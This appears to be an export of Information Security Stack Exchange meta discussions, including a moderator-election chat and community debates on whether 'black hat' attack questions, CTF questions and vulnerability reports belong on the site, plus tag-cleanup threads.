<p>But a question that is about whether your particular application happens to have a logic flaw is not likely to be of broader interest to the community.</p>

<p>The general principle is: can you find a question whose answers are likely to be of broader relevance to a larger community of security folks?  If so, ask that question.  If not, maybe it's not a good fit for this site.</p>

August 2012 Moderator Election Town Hall Chat,"<p>It's not hard to come up with a real question that's not too localized, that is clearly only for black hat purposes and in my opinion should get deleted.  For example:</p>

<blockquote>
  <p><strong>How do I do an ARP Spoofing Attack</strong>: I'm trying to steal my neighbors passwords/credit card numbers.  I set up a fake version of a popular shopping website and I can connect on their open wifi network.  I think I could do something like ARP spoofing or something to redirect them to my fake site.  It would be very appreciated if someone could give me a clear tutorial on how to carry out these attacks or suggest tools or other attacks that will do this for me.</p>
</blockquote>

<p>Compare to a similar, but perfectly valid question on the same topic:</p>

<blockquote>
  <p><strong>What is the threat from ARP Spoofing:</strong>  How are the attacks done and what can I do to safeguard myself from them?"" </p>
</blockquote>

<p>I would expect stupid answers to the first question posting links to kiddie hacker scripts with little to no explanation of what's going on so being of no use to white hats, but being immediately useful to kiddie black hats.  I wouldn't expect answers to the second question to be such low quality.  Instead, I'd expect them to explain the threat (what is ARP, how does level-2 routing work) and ways to prevent it (e.g., secure the wifi network, use https and other secure protocols). </p>

<p>The difference is subtle, but I believe quite important.  We shouldn't deliberately assist black hats or people doing blind penetration tests (that cannot be in any way differentiated from black hats).  Personally, I would like something to that effect to be present in the rules; otherwise we run the risk of doing <a href=""http://stackexchange.com/legal/content-policy"">illegal things</a> in some jurisdictions, though I am not a lawyer.  (Does suggesting ways for someone to do a successful SQL injection attack on a specific application count as abetting a criminal?)</p>

<p>You should not ask questions asking for assistance in doing illegal activities like breaking into a system you do not have permission to use, or searching for exploits in an web application that you did not write and do not have the source code for and we have no way of knowing if the web application's owners have given you permission to legally evaluate its security.  However, it is encouraged to ask and answer generic questions about various types of attacks, essentially in the context of how do the attacks work and how to best prevent them from occurring on your systems.  A general guideline of questions and answers should be whether this question could be useful to a white hat (e.g., not automated kiddie hacking scripts), but a description of weaknesses in certain weak methods and how they should be fixed.</p>

<hr>

<p>Long edit in response to Gilles:</p>

<p>My claim is that ""too localized"" and ""not a real question"" will not capture all black hat questions.  NaRQ can usually be avoided with clear language focused a specific aspect of an attack.  Localization can be avoided by asking about an attack relevant to many computers/situations.  (And in any case many too localized attacks are less localized than highly-upvoted questions like <a href=""https://security.stackexchange.com/questions/5701/i-just-discovered-major-security-flaws-in-my-web-store"">""I just discovered major security flaws in my web store""</a> ).  </p>

<p>I have no problem erring on the side of explaining principles behind an attack to increase the knowledge for defensive measures.   Yes, resources on the internet exist for black hats with tools and tutorials, but we don't have to be one of them (asking specific questions could be quite useful to script kiddies even if the knowledge exists elsewhere). </p>

<p>I don't think my belief is unique: let's look at other parts of the four of the five quotes you gave (Graham Lee's answer did want to allow any question asking about how to build malware without regard to intention):</p>

<ul>
<li><p><a href=""https://security.meta.stackexchange.com/a/130/2568"">rox0r - 'why risk losing legitimate users/conent'</a> ""Asking for exploits against a specific person (company) are banned"" while ""illustrating auth attacks and weakness should be discussed.

<li><p><a href=""https://security.meta.stackexchange.com/a/294/2568"">Avid - 'It's ... valid ... to be asking about the attack, exploit ...' </a> At some point, we need to rely on human sense - our collective noses for what is hinky"".  <a href=""https://security.meta.stackexchange.com/questions/14/should-we-accept-question-about-making-exploit-or-building-malware#comment12_15"">Elsewhere Avid said</a>:  [We should be] 'explaining principles, so as to better protect against [malware/exploits] rather than providing food for script kiddies.'</p></li>
<li><p><a href=""https://security.meta.stackexchange.com/a/297/2568"">ninefingers - 'There is ... only shades of gray'</a> ""its a subjective call"".  ""Pretty much the same question, but looks totally different in terms of intent. If I were to draw the line in the sand, I would say the key in my version would be that you're coming at it from a defence angle too.""</p></li>
</ul>

<p>These all seem to agree that intent is important; and the belief that black hat useful only questions/answers should be against our policies.  </p>

<p>This is not an academic issue that only exists for trick questions.  There have been mod-removed questions that specifically asked how do I do some black hat activity (e.g., <a href=""https://security.stackexchange.com/questions/1444/windows-7-exploited-remotely"">how to exploit windows 7 remotely</a> ) that were not too localized and easily could have been phrased as a real question.</p>

<p>Another example is <a href=""https://security.stackexchange.com/revisions/13997acf-e211-471b-9674-486b0e6500a5/view-source"">""How can I check whether it's SQL injection?  How can I exploit it?  I don't have access to the source code but can query it with more requests.""</a>.  I think questions like that (part of an attack or blackbox pen test) should be deleted, not edited into something <a href=""https://security.stackexchange.com/questions/18663/how-to-make-sql-injection-in-postgresqls-tsquery"">resembling a legitimate question</a>.  I have no problem with a quite similar question (possibly from a gray/white box pen test) saying ""the PHP source code executing the SQL query says <code>pg_query_params($dbconn, 'SELECT * from text_table where plainto_tsquery($1) ', array($user_input);</code> and gives error messages like ... is this vulnerable to SQL injection?"".  This is perfectly fine as it will be useful to know if you have to fix your weak source code (despite being more localized).  Note, the original version of the question had mod-removed answers that basically said ""try running this set of SQL injection kiddie scripts"".</p>

<p>How about something along the lines of</p>

<blockquote>
  <p>This site is not intended to be a resource for black hats to ask for assistance in implementing attacks (or doing blackbox penetration tests that simulate a black hat attack).  That said educational discussion of insecure practices, including demonstrating example code that bypasses weak security practices is encouraged to enlighten everyone on how to best defend your system against existing attacks.  While we prefer to err on the side of more disclosure, questions and answers that focus exclusively on implementation of black hat attacks may be moderated.</p>

OWASP Conference Sponsorship 2012,"<p>After several discussions in chat, most notably ones involving @Gilles, I've learned a couple key points.  To sum up, these add up to say that any truly undesirable or inappropriate ""black hat"" questions should already be getting handled per existing StackExchange policies.</p>

<ul>
<li>Any post that appears deliberately aimed at facilitating malicious and/or illegal activity runs afoul of the StackExchange <a href=""http://stackexchange.com/legal/terms-of-service"">Terms of Service</a>.  Particularly, these pieces of Section 4, ""Restrictions"" (emphasis mine):</li>
</ul>

<blockquote>
  <p>... <strong><em>Any fraudulent, abusive, or
  otherwise illegal activity</em></strong> or any use of the Services or Content in
  violation of this Agreement <strong><em>may be grounds for termination of
  Subscriber’s right to Services or to access the Network</em></strong>. </p>

</ul>

<p>So, for the purposes of <em>setting</em> policy, nothing really needs to be added to the FAQ - in fact, the existing section could be removed and our policy would still be the same.  However, for the sake of emphasizing our position against the <em>knowing</em> facilitation of illegal conduct, there <em>should</em> be something in the FAQ to re-iterate or paraphrase the relevant portions in the ToS.  Perhaps the existing section could use a thorough re-write, but it should not be done without.</p>

<p>Throughout all these discussions, I came to form an analogy of our community's situation to that of a responsible gun store owner who is operating in a jurisdiction that protects the right to keep and bear arms.</p>

<p><strong>As responsible citizens who are in the business of ""selling weapons"", we should happily ""sell"" our ""weapons"" to anyone - regardless of their intent - up until the point that we actually have a reasonable suspicion (or, and especially, confession) that their intent is malicious and/or illegal.

When that little diamond appears beside a name people tend to notice a little more, to take the comments with a little more weight. It gives better opportunity to help shape the discussion, or to stop disagreements before they can spiral out of control.</p>

<p><strong><img src=""https://www.gravatar.com/avatar/b379cfe07bbf58aab9414128a6e159f8?s=16&amp;d=identicon&amp;r=PG"" alt=""M&#39;vy""> <a href=""http://chat.stackexchange.com/users/13100/mvy"">M'vy</a> <a href=""http://chat.stackexchange.com/transcript/message/5887039#5887039"">answered</a>:</strong>  there is many obvious cases that does not require to reach the consensus of 5 vote to close (for example). The ability to manage migration is also a plus.</p>

This would be especially helpful when asking people to stop going off track in comments or take things to chat. On another note, 10k and 20k rep would take new members like me a VERY long time to reach even with active participation in the community.</p>

From the outside looking in - I respect the high rep users for being able to answer questions well and having a depth of expertise - but I look to the moderators for examples and insights on the rules of fair play.</p>

Also, for many of us, we could help cover diamond-level tasks (speedy closure/deletion of egregiously offending posts, moderation of problem users, etc.) during times when the current team is generally asleep or otherwise preoccupied.</p>

Functionally, diamonds allow button clicking. I can migrate questions myself instead of flagging (no matter <a href=""https://security.meta.stackexchange.com/questions/422"">how much I nudge the devs to get us a list...</a>). Truly, though, I'm already effective in being part of the community. It's not about what the diamond gives me... I'm starting to think it's not much. The question is more, ""What do I bring to the diamond?""</p>

But I also think that in any group (online of off) when one gets the ""blue diamond"" one's responses get absorbed by some members of the community in a different light - whatever you say gets amplified.  I've had to do this in other venues, and I find that I add a twist to any technical communication - saying to myself - ""is this an example I want others to follow?""</p>

I'll even fight for a change in attitude on the ""don't cares"" - up to the point where someone clearly tells me they don't want my help.  Then I have to judge if they are a trivial annoyance or actually causing enough harm to need removal.  Also I think each new user is a living test of our guidance - and see misguided folks as a perfect opportunity to improve our resources.</p>

You walk away when they're obstinate or they stop helping themselves. Unless users are going against the system, they're really not ""problematic"".

I have never really felt comfortable coming face first into confrontation. I like to think that I handle it well when it happens, but it's not something I strictly look forward to dealing with. I think I would try to point them in the right direction, but as we all too often see, when someone has already made up their mind it's generally difficult, if at all possible, to change it.</p>

The real question is ""How do you respond?"" and the best one can say is ""With as much grace and understanding as I can manage."".

I think the important thing to remember, as a mod, is that the community is more of a priority than janitorial work. If someone has a problem, I'd invite them to chat, and if a reasonable solution can't be found quickly, the situation should be documented on meta so that the rest of the community can weigh in.</p>

However, that's not to say that we've got a lack. The feedback there is important, and gives us a great way to sense public opinion on topics. After all, the site is for the community, so at least a good part of the decision making should be given to the community.</p>

I think the discussions on meta should <em>definitely</em> guide decisions. I really see the moderator's role as that of final arbiter and janitor. The discussions on chat and meta should really act as an advising event, then the moderators should make the final decision based on that guidance.</p>

That said, we probably do have a ""representative percentage"".  Although I myself am occasionally guilty of not following Meta closely enough (an issue I plan to rectify within myself in the near future), I've always been of the position that ""Those who care, Meta."".</p>

Meta, chat, questions &amp; comments - they all play a role in giving me some information about what the community and individuals are thinking.  Unless meta involvement was near 100%, I wouldn't really want meta to be the lone voice for the community - it's too much of a self-selecting group.  I'd look first to trends in questions and comments, second to meta, and third to chat - mostly because chat is my own weakest link in the SE  streams.</p>

On one hand, the flagger might not understand the topic well enough and is perceiving something as ""dangerously wrong"" even though it might be. If the answer actually represents a liability? Then I think I would start with a comment bringing up the issue, and then if it doesn't get addressed either edit out the offending section or delete the post.  My one true goal <em>should</em> be to not delete posts, but sometimes it just has to be done.</p>

I'd research the poster's history - in this case, if I really think it's malicious, I'll delete.  Honestly wrong, though, has a place here - I'd downvote, comment on why, and encourage others to do likewise.  Knowing what NOT to do is as important as knowing good practices as long as it's clear a bad idea is a bad idea.</p>

There is no reason to close a question for being black hat as many of them can be closed as NaRQ or too localized. Good questions with blackhat content CAN be a good resource on this site.

The StackExchange network and legal jurisdictions already has rules regarding illegal material, being a partner to committing crimes, etc, etc. I don't think material should be banned because it is ""Offensive Security"", I think material should be off-topic if it meets the off-topic definitions as per the FAQ and/or already disallowed by Terms of Service or the laws governing SEI.</p>

I don't practice it, but I study it. We need to be clear that blackhat is about <em>intent</em>, not <em>content</em>.  However, legality is independent of hatted-ness.</p>

<p><strong><img src=""https://www.gravatar.com/avatar/6fc641bdddde78a51c0db6b8527c54f7?s=16&amp;d=identicon&amp;r=PG"" alt=""Polynomial""> <a href=""http://chat.stackexchange.com/users/27025/polynomial"">Polynomial</a> <a href=""http://chat.stackexchange.com/transcript/message/5887369#5887369"">continued</a>:</strong>  I think blackhat topics are interesting, and when well written can provide a great resource to the community. However, where a blackhat question shows clear malicious intent, we should close it. Where <em>any</em> question demonstrates intent to commit illegal activities, we should close it.</p>

<p><strong><img src=""https://www.gravatar.com/avatar/6fc641bdddde78a51c0db6b8527c54f7?s=16&amp;d=identicon&amp;r=PG"" alt=""Polynomial""> <a href=""http://chat.stackexchange.com/users/27025/polynomial"">Polynomial</a> <a href=""http://chat.stackexchange.com/transcript/message/5887389#5887389"">concluded</a>:</strong>  One caveat is the grey zone introduced where a blackhat question doesn't explicitly show malintent, and is not illegal, but might still be morally unjust. I think, at that point, we have to leave it to the moral compasses of answerers. As moderators we need to keep a careful eye on such topics, to make sure arguments don't occur, and that the question doesn't go off the rails.</p>

I'll drop my response from Meta in here, as I think it sums it up nicely.

Knowing the moderators as I do certainly means I have a great window into decisions. <em>I</em> don't feel that the site itself needs to change the way it runs, but that's also not entirely my decision to make. Even if I disagree, if enough of the community wants a change it should be given serious consideration.</p>

I'd request that they take it to chat. I'll give them both suspensions if they do not cease their war. High respect/rep in the community does not mean one is exempted from the rules.</p>

<p><strong><img src=""https://www.gravatar.com/avatar/6fc641bdddde78a51c0db6b8527c54f7?s=16&amp;d=identicon&amp;r=PG"" alt=""Polynomial""> <a href=""http://chat.stackexchange.com/users/27025/polynomial"">Polynomial</a> <a href=""http://chat.stackexchange.com/transcript/message/5887412#5887412"">answered</a>:</strong>  I'd remind both of them that they're entitled to their opinions, but the comments section is not designed for a debate. They should take their discussion to chat. I'd also ask them to be civil. Whilst it's important to be passionate about such topics, it's not constructive to have a flame war.</p>

<p><strong><img src=""https://www.gravatar.com/avatar/6fc641bdddde78a51c0db6b8527c54f7?s=16&amp;d=identicon&amp;r=PG"" alt=""Polynomial""> <a href=""http://chat.stackexchange.com/users/27025/polynomial"">Polynomial</a> <a href=""http://chat.stackexchange.com/transcript/message/5887423#5887423"">continued</a>:</strong>  If they continued to flame each other, they'd both end up warned and suspended. High reputation is not grounds for being above the law. If anything they should be held to higher standards, since they've been around long enough to know what's acceptable.</p>

<p><strong><img src=""https://www.gravatar.com/avatar/b379cfe07bbf58aab9414128a6e159f8?s=16&amp;d=identicon&amp;r=PG"" alt=""M&#39;vy""> <a href=""http://chat.stackexchange.com/users/13100/mvy"">M'vy</a> <a href=""http://chat.stackexchange.com/transcript/message/5887417#5887417"">answered</a>:</strong>  Highly respected members aren't highly respected for nothing. First think is to transfer this from the site to the chat, then discuss the matter. If this is really out of control, then I'd give a warning before using more punitive means.</p>

<p><strong><img src=""https://www.gravatar.com/avatar/481707331ea4d07ae2490bb88ddfd7ca?s=16&amp;d=identicon&amp;r=PG"" alt=""Scott Pack""> <a href=""http://chat.stackexchange.com/users/1516/scott-pack"">Scott Pack</a> <a href=""http://chat.stackexchange.com/transcript/message/5887427#5887427"">answered</a>:</strong>  That's a problem on two fronts. One is that bickering like that <em>should</em> be tamped down so we can keep a civil discourse. The other problem is that if they're respected members, then that also sets a precedent that their behavior is acceptable. I think the first step should be to weigh in and ask them to chill it out. If they don't, or if it escalates then it needs to be something along the lines of ""Take it to a chat."" At which point the offensive material should be removed.</p>

<p><strong><img src=""https://www.gravatar.com/avatar/8f8571493d71202986f2a6ab0dbd7c23?s=16&amp;d=identicon&amp;r=PG"" alt=""Iszi""> <a href=""http://chat.stackexchange.com/users/15/iszi"">Iszi</a> <a href=""http://chat.stackexchange.com/transcript/message/5887533#5887533"">answered</a>:</strong>  Again, this can be very situational.  One thing you don't want to do, is join the heated argument by participating in a public comment war.  Most of the highly respected members of this community, I think,  are also active chat participants.  So, I would probably lean on that as a tool to help resolve the issue in an ""offline"" manner.</p>

<p><strong><img src=""https://www.gravatar.com/avatar/8f8571493d71202986f2a6ab0dbd7c23?s=16&amp;d=identicon&amp;r=PG"" alt=""Iszi""> <a href=""http://chat.stackexchange.com/users/15/iszi"">Iszi</a> <a href=""http://chat.stackexchange.com/transcript/message/5887558#5887558"">continued</a>:</strong>  Unfortunately, if things get too extreme, certain measures have to be taken regardless of who the member is.  Temporary restrictions on posting privileges, or closures/locks on the related threads are not out of the question.  One thing I may have neglected to remember though, is that moderators also have access to e-mail contact - I'd probably like to try that before anything that adversely affects the user's public profile or a (good) question.</p>

<p><strong><img src=""https://www.gravatar.com/avatar/8f8571493d71202986f2a6ab0dbd7c23?s=16&amp;d=identicon&amp;r=PG"" alt=""Iszi""> <a href=""http://chat.stackexchange.com/users/15/iszi"">Iszi</a> <a href=""http://chat.stackexchange.com/transcript/message/5887562#5887562"">concluded</a>:</strong>  Of course, comment cleanup is almost always a must for these cases.</p>

I'd aim for a ""take it outside, guys"" approach - trying to get them to duke it out in a way that isn't so public and doesn't derail the community.</p>

I'd probably spend a solid hour on it at minimum. I'm already pretty active in chat, and keep an eye on various goings on in meta. I think my time budget should be <em>whatever I can afford</em>, because I love Sec.SE and I enjoy interacting with people with it. That's the motivation I have, so it's not going to change if I become a mod.</p>

Between work and home life I'm much more likely to have 10-15 minutes here than there rather than long stretches of devoted time. Based on conversations I've had with moderators, both here and for other sites, handling the flag queueueueue can be be handled great with that kind of involvement. Typically, I'm available 8am-5pm UTC-4/5, and then off and on after that.</p>

If that grows to be too much, then one of two things need to be considered:  1.) Do I really have enough time in my life to be a moderator.  2.) Should we ask SEI to open up another slot?  My core time period of the day is generally daylight hours, U.S. Eastern, plus some late night hours.</p>

Quite honestly, this is the hardest part for me - I suppose no one has a lot of ""free time"" - I'm hoping to rebalance my time - less time spent answering questions, more spent moderating, and when and how I do the moderation is it's own question.   I suspect the time budget required may be far more than I have available as it grows - there's a point with any community where moderation needs explode.</p>

Not sure I agree!  The Security questions are among the toughest I've answered across the SE sites. :)  Yes, it's an ego hit - but it's seemed to me that once I ended up on the first page of users, the warm glow of gaining rep dimmed in comparison to the opportunity to guide a community.  I'm banking on the fact that as with other forums, the warm feeling of a growing community that is ""mine"" will replace rep as my point of satisfaction.</p>

I think a major reason some people rush to certain rep levels is because certain privileges are tied to them, and those privileges greatly facilitate our ability to help make (and keep) this community a better place.  Having all those powers come with the blue diamond removes the <em>need</em> to accumulate rep.</p>

I'd like the ability to zero-out all votes on answers to a question that has been migrated. I'd leave the mechanics of it up to a community meta decision, but it's important. However, in lieu of that, I'd take that person to chat and try to convince them.</p>

The other half is acting as a representative of the community. Sure, I can go to a conference and tell people that I'm a community member, but it doesn't carry nearly the same weight as saying one moderates. I think that kind of broader community outreach is a big part as well. Getting the word out, trying to get more users! That's the key.</p>

I think you've effectively listed most of the things that are exclusively restricted to moderators.  Then again, I don't have access to moderator tools to know what other sorts of useful functions or information comes with them.  I would probably like to use whatever new tools I can to seek out and find ways to improve existing questions and answers, or discover new ways to drive traffic to the site.</p>

I stopped last year after some personal tragedy. I'd spend more time at conferences talking our community up. It's far easier to open a conversation with, ""I'm a moderator of this awesome community"" rather than, ""Hey, I'm just a user here, but it's really cool."" Serving the diamond!</p>

The Venn diagram of usefulness for Site/Meta/Chat do have some overlap, but they're all very important parts of the whole. I think meta.stackexchange is one that I'll have to get more involved in. While we are a site of our own right, it is where broad sweeping changes and discussions get made. The mods <em>should</em> know what's going on everywhere, so that we can frame those changes to what matters here.</p>

After that, Meta participation is definitely important, with Chat to supplement it.  The Blog is very important for publicizing our site, but (myself being guilty of this as well) I feel it is largely ignored.  Meta.SO is more of an ""as needed"" thing, I think, for the relatively rare occasion where an issue is not localized to Sec.SE and needs resolution from SEI or a consensus from the wider SE community.</p>

I do tend to use it quite sparingly on here, so I don't think I'd be flying off the handle with closes left right and center. It's important to wait for other people's opinions. So I'd post it in chat, wait for a consensus, then close if necessary. Same goes for questions with a single close flag. It's important for more than one person to give their view.</p>

As a mod, I would probably hang back a little further. In most situations, I think a mod's close vote should be at least 3rd. 1/2</p>

I'll definitely be more conscious of what I do with my close privilege.  I think I've got a good handle on when questions <em>need</em> the mod-hammer as opposed to perhaps just comments and edits.  I expect I'll be seeking a lot of community opinion though, mostly via chat or existing close votes, early on.</p>

They've been around this site for quite some time, and have been regularly active during their time here.

It's a fair point.  I do browse meta  and would definitely be called a lurker - it may be I just don't have that many strong opinions.  Chat is tricky for me from my work - I have a high-interruption job, so balancing chat interruptions and work interruptions generally hadn't worked for me.  If that eliminates me as a moderator candidate, I understand - but I volunteered for the post feeling that SE involvement was the primary element to the equation.</p>

What is our minimum expected knowledge?,"<p>I don't think that question was closed by the community for being ""below the bar"" of knowledge, but rather the question was poorly phrased, and seemed that the asker did not even give thought to what he was asking.   </p>

<p>I don't think we need to have a ""minimum expected knowledge"" at all - when it comes to security.<br>
A complete security newbie is welcome to ask introductory level questions about security.  </p>

<p>However, I think it is fair to expect that the asker at least have a basic knowledge about the <em>content</em> of his question, i.e. whatever it is he's asking security <em>about</em>.<br>
If you're asking the most basic of questions on how to secure an Apache webserver - that's fine, <strong>if</strong> you know what an Apache webserver <em>is</em> (and how to configure it).<br>
If you're asking how to prevent SQL Injection in PHP, from the ground up - that's great, <strong>if</strong> you know how to write code in PHP.<br>
If you're asking how to bypass a firewall - <strong>you should probably know</strong> what a firewall <em>is</em> and what it <em>does</em> (though asking about that here is also okay, but that is a completely different question). You should probably have a clue about how networks work, how they're set up, the difference between a network and a workstation, and so forth.   </p>

<p>In other words: we should be willing to educate even kindergarden level - about <em>security</em>. Nothing else.  (And btw, even high-level non-security questions would be offtopic, anyway.) 
Note, however, that sometimes the simplest questions are often answered on Wikipedia, and as always we do expect the asker to do <em>at least</em> a minimal amount of research, before asking. </p>

<p>I think the reason the linked question was closed, was because it was assuming a level of (non-security) knowledge, that was not apparently there. It felt to me that the asker didn't understand network basics, or really what a firewall is and does (and does not do). Or perhaps the question just left a large gap in specificity.<br>
I think that had the asker just came out and said ""WTF is this firewall thing, and what does it do for my network?"" it would have been ontopic, though then answers would probably have been best served by RTFWA (read the Wikipedia article).  </p>
",<discussion>,6,,125
What is our minimum expected knowledge?,"<p>I think the biggest problem with the question was not the minimum expected knowledge, but that the question was not sufficiently specific about what was being asked: the question was vague and over-broad and it was hard to tell what exactly the question was.  The comments didn't help derive a narrower focus.</p>

<p>In general, I don't think we need to have much in the way of minimum expected level of knowledge.  As the FAQ says, the IT Security site is intended ""for Information Security professionals to discuss protecting assets from threats and vulnerabilities""; anything that falls within that scope seems like it could be fine.</p>

<p><em>However</em>, that said, I <em>do</em> think it is reasonable to expect people to do a little bit of background research on their own first.  So, if the question is completely answered by Wikipedia or by the first hit on Google, and if the question-asker hasn't tried to read those, then the question is probably too low-quality for us.  So, in that case, I would expect that sort of question might still be closed -- not because of minimum expected level of knowledge, but because of lack of research.  They certainly don't need to do a comprehensive literature survey before asking a question here, but they should probably take some very basic steps on their own first.</p>

<p>In short, here are two necessary (but not sufficient) requirements for a question to be a good one (in my opinion):</p>

<ul>
<li><p>The question must be specific about what is being asked.</p></li>
<li><p>The question-asker should do a little bit of basic research first on their own, before asking.  I don't expect the world, but I do expect a little bit.</p></li>
</ul>

<p>As always, the <a href=""https://security.stackexchange.com/faq"">faq</a> has good advice on how to ask a good question.</p>

<p>(JeffFerland, I'm sure I'm not saying anything that's particularly new for you -- I just wanted to write this down for others who may chance upon this page.)</p>

Should we allow questions about the various hacking wargames and CTFs available on the internet?,"<p><strong>Reasons For:</strong></p>

<p>Many of the sites are about specific penetration testing concepts and techniques. There are sites devoted to web application hacking, privilege escalation and others. Thus the core questions would be on topic here.</p>

<p>Some of the sites are quite popular. They can help draw traffic to Sec.SE if we provide high quality answers that explains the questions and their solutions in great detail.</p>

<p>This would be a good balance of black hat vs white hack content. All the technique involved would of course be applicable to a malicious user. However, at least such questions would show clearly what the intention of the asker is, which is IMO a good improvement over most of the <em>current</em> ""black hat"" questions which are vague at best.</p>

<p><strong>Reasons Against:</strong></p>

<p>It might attract a lot of low quality questions. I don't think this is necessarily a bad thing if most of the questions can be edited and salvaged.</p>

<li>Will others be more likely to search here to find answers to this type of question?</li>

",<discussion><migration><exact-duplicates>,3,,54
Partially on-topic questions with dupes on more suitable sites,"<p><strong>Against:</strong>
Most of these sites have their forums and hence posting here would be redundant. I feel its better if people used that site's own forum managed by the creators of those sites.</p>
",<discussion><migration><exact-duplicates>,3,,54
Partially on-topic questions with dupes on more suitable sites,"<p><em>If it is off-topic for Security.SE</em>, I would suggest migrating to where it is on-topic and let them deal with it.  If the question has already been answered on their site and they close it as a duplicate, that's fine.  In other words, this is the ""Migrate to SU, let them deal with it"" option.</p>

<p>I don't understand why the fact that SU is likely to close it as a dup would make us shy away from migrating the question to the site where it belongs.  If it is off-topic for us, it is off-topic.  And if the question has already been answered there before, it has already been answered, and there's not really any need to repeat that.</p>

<p><em>If it is on-topic for Security.SE</em>, I would suggest leaving it here, even if there is some overlap with another question on another community.  This community often has a different perspective and provides a different sort of answer.</p>

<p>Example: If asking about conceptually how data recovery works and under what circumstances it might be feasible, then that's the sort of question that our community can probably give great answers to.  If asking for a step-by-step recipe of how to do it, that might be the sort of thing that ServerFault will have better answers for.

Potential Vulnerability Disclosure **of other websites** in SE,"<p>I believe it would be. As long as the discussion has depth to it, I think it should be acceptable.</p>
",<discussion><acceptable-question>,5,,61
Potential Vulnerability Disclosure **of other websites** in SE,"<p>It depends upon precisely what question you would be asking.  I'd have to see the question you posted to be sure; without seeing it, my guess is that this site is not a perfect fit, though it could easily go either way.</p>

<p>If you post a question describing specific vulnerability in a particular version of a particular web site and asking whether it is indeed a valid vulnerability, well, that might end up being a narrow and localized question.  It would probably be localized in applicability, because it is only relevant to a single web site.  (However, the applicability might depend upon how widely-used the web site is.)  It would probably be localized in time, because it would only be relevant to that particular version of the software and would become irrelevant as soon as the website is updated.  (However, the applicability might depend upon how novel and interesting the vulnerability is in its own right, and whether there are any new lessons of lasting interest to be derived from it.)</p>

<p>Anyway, I'm just guessing and speculating, so don't take my answer too seriously.  I think one way to approach it is to ask yourself: is this the sort of question that is of lasting interest to a significant community of folks?  If yes, it is probably on-topic.  If not, it might squeak by, but it doesn't sound like a clear-cut case that is on-topic.</p>

<p>If you're not sure whether the question is on-topic, I suggest posting it and then folks can form their own opinion once they have something specific to look at.  At worst, if it is off-topic, it'll be closed, and no great harm done.</p>

<p>And, of course, it is possible your experience with this vulnerability might suggest a question of broader interest: e.g., how to confirm whether such-and-such class of vulnerabilities are indeed exploitable; how to avoid such-and-such type of vulnerability when building web applications; how to report vulnerabilities in a way that maximizes the chances that the public interest will be served; etc.  Those could be great questions for this site, if they haven't already been asked here.</p>

Should web-service tag be merged?,"<p>In looking through the 34 questions tagged <a href=""https://security.stackexchange.com/questions/tagged/web-service"" class=""post-tag"" title=""show questions tagged &#39;web-service&#39;"" rel=""tag"">web-service</a> I can see 4 that I would actually say deserve the tag, and in my opinion none need it, as a more relevant tag may be <a href=""https://security.stackexchange.com/questions/tagged/json"" class=""post-tag"" title=""show questions tagged &#39;json&#39;"" rel=""tag"">json</a> or <a href=""https://security.stackexchange.com/questions/tagged/http"" class=""post-tag"" title=""show questions tagged &#39;http&#39;"" rel=""tag"">http</a> so my feeling would be to do a quick run through those 34 questions and remove the <a href=""https://security.stackexchange.com/questions/tagged/web-service"" class=""post-tag"" title=""show questions tagged &#39;web-service&#39;"" rel=""tag"">web-service</a> tag from them; using a more appropriate tag as required.</p>
",<discussion><tags><tag-synonyms>,0,,73
Should web-service tag be merged?,"<p>It does seem that the tag was not used in a consistent fashion, but to be honest that is true about a great many tags...  </p>

<p>I see there being a substantial difference between <a href=""https://security.stackexchange.com/questions/tagged/web-application"" class=""post-tag"" title=""show questions tagged &#39;web-application&#39;"" rel=""tag"">web-application</a> and <a href=""https://security.stackexchange.com/questions/tagged/web-service"" class=""post-tag"" title=""show questions tagged &#39;web-service&#39;"" rel=""tag"">web-service</a> - a web application is something you can browse to, and a web service is something you consume from another application (either a server application or client application).    </p>

<p>Of the 34 questions tagged <a href=""https://security.stackexchange.com/questions/tagged/web-service"" class=""post-tag"" title=""show questions tagged &#39;web-service&#39;"" rel=""tag"">web-service</a>, about 1/3 do not fit that description, and should probably be retagged.   </p>

<p>Of the rest, I see the tag as being very much needed, and specific. Note that I am not referring (nor is the tag) only to SOAP/WSDL Web Services, but any type of ""web API"" - This does include SOAP and WSDL, but also REST, JSON, XML RPC, and more.<br>
There are substantial issues specifically to non-browsing Web calls (for lack of a non-recursive term), such as session management, SSL channels, and more.  </p>

<p>However, I do agree that it seems the term <code>web service</code> is ambiguous, and could possibly stand to be changed.<br>
How about <a href=""https://security.stackexchange.com/questions/tagged/web-api"" class=""post-tag"" title=""show questions tagged &#39;web-api&#39;"" rel=""tag"">web-api</a>? (for the most part I dont yet think a tag specifically for WSDL is needed, though if it does it can easily exist in parallel...)<br>
Though that too kinda sounds overly specific, if you're not already familiar with the term it sounds like a specific framework... </p>

Cleanup SHA tags,"<p>Actually, since this is a <em>security</em> site, and I expect almost any algorithm-specific question to be on the <a href=""http://cryptography.stackexchange.com"">Cryptography</a> site instead of here, I personally think we shouldn't even have any algorithm-specific tags, <em>at all</em>.   </p>

<p>Rather, I would instead of both <a href=""https://security.stackexchange.com/questions/tagged/sha2"" class=""post-tag"" title=""show questions tagged &#39;sha2&#39;"" rel=""tag"">sha2</a> and <a href=""https://security.stackexchange.com/questions/tagged/sha256"" class=""post-tag"" title=""show questions tagged &#39;sha256&#39;"" rel=""tag"">sha256</a>, I would retag them both as <a href=""https://security.stackexchange.com/questions/tagged/hash"" class=""post-tag"" title=""show questions tagged &#39;hash&#39;"" rel=""tag"">hash</a>; I would do the same for <a href=""https://security.stackexchange.com/questions/tagged/sha"" class=""post-tag"" title=""show questions tagged &#39;sha&#39;"" rel=""tag"">sha</a> and <a href=""https://security.stackexchange.com/questions/tagged/sha-1"" class=""post-tag"" title=""show questions tagged &#39;sha-1&#39;"" rel=""tag"">sha-1</a>. Same with <a href=""https://security.stackexchange.com/questions/tagged/md5"" class=""post-tag"" title=""show questions tagged &#39;md5&#39;"" rel=""tag"">md5</a>.   </p>

<p>I would do the same for encryption algorithms, too - e.g. instead of <a href=""https://security.stackexchange.com/questions/tagged/aes"" class=""post-tag"" title=""show questions tagged &#39;aes&#39;"" rel=""tag"">aes</a> and <a href=""https://security.stackexchange.com/questions/tagged/3des"" class=""post-tag"" title=""show questions tagged &#39;3des&#39;"" rel=""tag"">3des</a> simply have <a href=""https://security.stackexchange.com/questions/tagged/encryption"" class=""post-tag"" title=""show questions tagged &#39;encryption&#39;"" rel=""tag"">encryption</a>, or possibly <a href=""https://security.stackexchange.com/questions/tagged/symmetric-encryption"" class=""post-tag"" title=""show questions tagged &#39;symmetric-encryption&#39;"" rel=""tag"">symmetric-encryption</a>.   </p>

